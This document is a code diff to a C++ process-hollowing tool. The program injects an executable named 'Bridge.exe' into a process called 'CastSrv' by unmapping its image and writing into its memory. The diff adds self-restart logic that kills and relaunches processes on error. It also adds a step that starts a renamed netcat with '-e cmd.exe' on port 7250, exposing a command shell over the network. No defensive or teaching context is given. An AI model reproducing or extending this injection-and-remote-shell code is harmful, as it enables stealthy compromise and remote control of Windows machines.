@@ -5,6 +5,8 @@
 #include "internals.h"
 #include "pe.h"
 
+bool errorOccured = false;
+
 void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 {
 
@@ -29,8 +31,9 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 	if (!pProcessInfo->hProcess)
 	{
+		errorOccured = true;
 		printf("Error creating process\r\n");
-
+		
 		return;
 	}
 
@@ -54,6 +57,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		printf("Error opening %s\r\n", pSourceFile);
+		errorOccured = true;
 		return;
 	}
 
@@ -84,6 +88,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	if (dwResult)
 	{
 		printf("Error unmapping section\r\n");
+		errorOccured = true;
 		return;
 	}
 
@@ -101,6 +106,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	if (!pRemoteImage)
 	{
 		printf("VirtualAllocEx call failed\r\n");
+		errorOccured = true;
 		return;
 	}
 
@@ -131,7 +137,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 	))
 	{
 		printf("Error writing process memory\r\n");
-
+		errorOccured = true;
 		return;
 	}
 
@@ -155,6 +161,7 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 		))
 		{
 			printf ("Error writing process memory\r\n");
+			errorOccured = true;
 			return;
 		}
 	}	
@@ -223,11 +230,11 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 					if (!bSuccess)
 					{
 						printf("Error writing memory\r\n");
+						errorOccured = true;
 						continue;
 					}
 				}
 			}
-
 			break;
 		}
 
@@ -288,18 +295,54 @@ void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	char* pPath = new char[MAX_PATH];
-	GetModuleFileNameA(0, pPath, MAX_PATH);
-	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-	strcat(pPath, "HelloWorld.exe");
+	char* bridgePath = new char[MAX_PATH];
+	GetModuleFileNameA(0, bridgePath, MAX_PATH);
+	bridgePath[strrchr(bridgePath, '\\') - bridgePath + 1] = 0;
+	strcat(bridgePath, "Bridge.exe");
 	
-	CreateHollowedProcess
-	(
-		"CastSrv",
-		pPath
-	);
+	errorOccured = false;
+	CreateHollowedProcess("CastSrv",bridgePath);	
+	
+	//if something went wrong restart everything
+	if (errorOccured) {
+		//cleanup
+		system("taskkill /IM CastSrv.exe /F");
 
-//	system("pause");
+		//start new instance
+		char* currentExe = new char[MAX_PATH];
+		GetModuleFileNameA(NULL, currentExe, MAX_PATH);
+		printf("Creating new instance -- bye\r\n");
+
+		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
+		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+		CreateProcessA(0,currentExe,0,0,0,0,0,0,pStartupInfo,pProcessInfo);
+
+		if (!pProcessInfo->hProcess){
+				printf("Error creating new instance -- bye\r\n");
+				return -1;
+		}		
+
+		//exit this instance
+		return -1;
+	}
+
+	//start netcat
+	char* basePath = new char[MAX_PATH];
+	GetModuleFileNameA(0, basePath, MAX_PATH);
+	basePath[strrchr(basePath, '\\') - basePath + 1] = 0;
+	strcat(basePath, "Base.exe 127.0.0.1 7250 -e cmd.exe");
+
+	printf("Creating Base process\r\n");
+	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
+	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+	CreateProcessA(0,basePath,0,0,0,0,0,0,pStartupInfo,pProcessInfo);
+
+	if (!pProcessInfo->hProcess)
+	{
+		printf("Error creating Base process\r\n");
+		errorOccured = true;
+		return -1;
+	}
 
 	return 0;
 }
